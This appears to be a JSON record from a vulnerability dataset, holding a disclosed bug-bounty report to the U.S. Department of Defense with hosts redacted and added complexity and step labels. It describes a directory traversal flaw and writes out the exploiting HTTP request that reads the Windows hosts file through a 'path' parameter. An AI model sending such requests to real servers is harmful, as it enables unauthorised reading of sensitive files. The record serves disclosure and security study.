@@ -1,0 +1,38 @@
+{
+    "reported_to": "U.S. Dept Of Defense",
+    "reported_by": "0x45 ",
+    "title": "Directory Traversal at \u2588\u2588\u2588\u2588\u2588",
+    "content": "\nHi DoD!\nI found directory traversal vulnerability at \u2588\u2588\u2588\u2588. I didn't find available title for this issue that's why I selected remote file inclusion.\nHost: \u2588\u2588\u2588\u2588\u2588\u2588\nVulnerability: Directory Traversal in Windows Server\nTool Used: BurpSuite\nParameter: path\nHTTP GET Request###\nGET /File/Download?path=C:/WINDOWS/System32/drivers/etc/hosts\nResponse\n\u2588\u2588\u2588\nImpact\nAttacker could read sensitive file in server\nSystem Host(s)\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nAffected Product(s) and Version(s)\nCVE Numbers\nSteps to Reproduce\nMake HTTP Request like that;\nGET /File/Download?path=C:/WINDOWS/System32/drivers/etc/hosts HTTP/1.1\nHost: \u2588\u2588\u2588\nCookie: .AspNetCore.Antiforgery.GupjSGuR2ZQ=CfDJ8GfYfRi9j8NNoBU6zVTpTKTbaG72CuADzxVVYVr9efssbxXYtgzCMF2H6PvdOcF0RxMExCsaObiVNuop1ouJa2Nb0k3z4KYTy2ih_nRbxREcZZo-3LBJPXq05kvRrRF6p02TakoqGzC6VUTdPRw-bo8; TimeZoneOffset=-240\nCache-Control: max-age=0\nSec-Ch-Ua: \"Chromium\";v=\"103\", \".Not/A)Brand\";v=\"99\"\nSec-Ch-Ua-Mobile: ?0\nSec-Ch-Ua-Platform: \"macOS\"\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9\nSec-Fetch-Site: none\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9\nConnection: close\nSuggested Mitigation/Remediation Actions\nInput Validation for path parameter\n\n",
+    "severity": [
+        7.0,
+        8.9
+    ],
+    "bounty": null,
+    "weaknesses": [
+        "Path Traversal"
+    ],
+    "screenshots": {},
+    "disclosed_date": 1663201620,
+    "report_url": "https://hackerone.com/reports/1641148",
+    "is_multi_component": false,
+    "complexity": "LOW",
+    "novelty": "LOW",
+    "vuln_category": "WEB_APP",
+    "steps": [
+        [
+            1,
+            "Identify the vulnerable endpoint that accepts the 'path' parameter in the HTTP request."
+        ],
+        [
+            2,
+            "Modify the 'path' parameter to point to a sensitive file location (e.g., C:/WINDOWS/System32/drivers/etc/hosts) and send the HTTP GET request."
+        ]
+    ],
+    "vuln_description": "Directory traversal vulnerability in a Windows Server application that allows an attacker to read sensitive files by manipulating the 'path' parameter in the HTTP request.",
+    "reason": "The vulnerability is straightforward to discover as it involves a simple manipulation of a single parameter in the HTTP request. There are no complex interactions or state manipulations required.",
+    "new_complexity": "LOW",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": null
+}
